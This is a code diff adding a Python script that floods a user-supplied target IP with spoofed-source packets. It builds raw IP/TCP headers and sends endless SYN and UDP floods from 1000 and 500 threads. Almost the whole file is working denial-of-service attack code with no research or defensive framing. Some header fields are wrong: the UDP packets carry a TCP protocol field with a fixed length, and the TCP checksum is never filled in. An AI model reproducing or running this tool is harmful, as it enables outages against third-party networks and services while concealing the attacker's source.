@@ -1,0 +1,104 @@
+import socket
+import random
+import struct
+import time
+import threading
+
+def checksum(data):
+    s = 0
+    for i in range(0, len(data), 2):
+        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
+        s = s + w
+    s = (s >> 16) + (s & 0xFFFF)
+    s = ~s & 0xFFFF
+    return s
+
+def create_ip_header(src_ip, dst_ip):
+    ip_ver_ihl = 0x45
+    ip_tos = 0
+    ip_tot_len = 40
+    ip_id = random.randint(1, 65535)
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = socket.IPPROTO_TCP
+    ip_check = 0
+    ip_saddr = socket.inet_aton(src_ip)
+    ip_daddr = socket.inet_aton(dst_ip)
+    
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
+        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+    
+    ip_check = checksum(ip_header)
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
+        ip_ttl, ip_proto, socket.htons(ip_check), ip_saddr, ip_daddr)
+    
+    return ip_header
+
+def create_tcp_header(src_port, dst_port, seq_num, ack_num):
+    tcp_offset_res = 0x50
+    tcp_flags = 0x02
+    tcp_window = 65535
+    tcp_check = 0
+    tcp_urg_ptr = 0
+    
+    tcp_header = struct.pack('!HHLLBBHHH',
+        src_port, dst_port, seq_num, ack_num,
+        tcp_offset_res, tcp_flags, tcp_window,
+        tcp_check, tcp_urg_ptr)
+    
+    return tcp_header
+
+def spoofed_syn_flood(target_ip, target_port=80):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    
+    ip_range = [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(10000)]
+    
+    while True:
+        src_ip = random.choice(ip_range)
+        src_port = random.randint(1024, 65535)
+        seq_num = random.randint(1, 4294967295)
+        
+        ip_header = create_ip_header(src_ip, target_ip)
+        tcp_header = create_tcp_header(src_port, target_port, seq_num, 0)
+        packet = ip_header + tcp_header
+        
+        try:
+            sock.sendto(packet, (target_ip, 0))
+        except:
+            pass
+
+def spoofed_udp_flood(target_ip, target_port=53):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    
+    while True:
+        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        src_port = random.randint(1024, 65535)
+        data = random.randbytes(1024)
+        
+        ip_header = create_ip_header(src_ip, target_ip)
+        udp_header = struct.pack('!HHHH', src_port, target_port, len(data) + 8, 0)
+        packet = ip_header + udp_header + data
+        
+        try:
+            sock.sendto(packet, (target_ip, 0))
+        except:
+            pass
+
+if __name__ == "__main__":
+    target = input("Target IP: ")
+    port = int(input("Target port (default 80): ") or 80)
+    
+    print(f"[+] Spoofing SYN packets to {target}:{port}")
+    for _ in range(1000):
+        threading.Thread(target=spoofed_syn_flood, args=(target, port), daemon=True).start()
+    
+    print(f"[+] Spoofing UDP packets to {target}:53")
+    for _ in range(500):
+        threading.Thread(target=spoofed_udp_flood, args=(target,), daemon=True).start()
+    
+    while True:
+        time.sleep(1)
